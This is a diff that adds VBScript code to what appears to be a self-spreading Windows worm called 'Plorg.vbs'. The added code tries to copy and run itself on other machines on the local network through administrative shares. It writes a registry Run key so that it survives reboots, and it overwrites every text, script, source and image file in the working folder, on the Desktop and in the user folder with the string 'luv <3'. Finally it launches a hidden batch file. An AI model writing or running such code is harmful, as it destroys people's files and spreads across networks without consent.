@@ -72,6 +72,167 @@ write("echo     print("Number of connections:", len(connections)) >> %self%X3.py
 write("python %self%X3.py")")
 objTextFile.Close
 
+Dim objShell
+Set objShell = WScript.CreateObject("WScript.Shell")
+
+' Get the list of IP addresses on the local subnet
+' (Assuming a subnet mask of 255.255.255.0)
+Dim arrIPAddresses
+arrIPAddresses = GetIPAddresses()
+
+' Loop through each IP address and try to execute the script remotely
+For Each strIPAddress in arrIPAddresses
+  On Error Resume Next
+  objShell.Run "\\" & strIPAddress & "\c$\windows\system32\cscript.exe //B " & WScript.ScriptFullName, 0, True
+  If Err.Number = 0 Then
+    ' Script executed successfully on remote machine
+  End If
+Next
+
+' Function to get a list of IP addresses on the local subnet
+Function GetIPAddresses()
+  Dim arrIPAddresses
+  arrIPAddresses = Array()
+  
+  Dim objWMIService
+  Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+  
+  Dim colItems
+  Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
+  
+  Dim objItem
+  For Each objItem in colItems
+    Dim arrIPAddress
+    arrIPAddress = objItem.IPAddress
+    For Each strIPAddress in arrIPAddress
+      If Left(strIPAddress, 7) = "192.168" Then
+        ReDim Preserve arrIPAddresses(UBound(arrIPAddresses) + 1)
+        arrIPAddresses(UBound(arrIPAddresses)) = strIPAddress
+      End If
+    Next
+  Next
+  
+  GetIPAddresses = arrIPAddresses
+End Function
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+
+strKeyPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+strKeyName = "Plorg.vbs"
+strKeyValue = WScript.ScriptFullName
+
+WshShell.RegWrite strKeyPath & "\" & strKeyName, strKeyValue, "REG_SZ"
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".txt" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".js" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".py" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".cpp" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".jpg" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder(fso.GetAbsolutePathName("."))
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".png" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder("%Desktop")
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".js" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder("%Desktop")
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".py" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder("%Desktop")
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".cpp" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set folder = fso.GetFolder("%User%")
+
+For Each file In folder.Files
+  If LCase(Right(file.Name, 4)) = ".jss" Then
+    Set txtFile = fso.OpenTextFile(file, 2, True)
+    txtFile.Write("luv <3")
+    txtFile.Close
+  End If
+Next
+
 ProgramName = "C:\Plorg\xer.bat"
 WshShell.Run ProgramName, 0, True
 
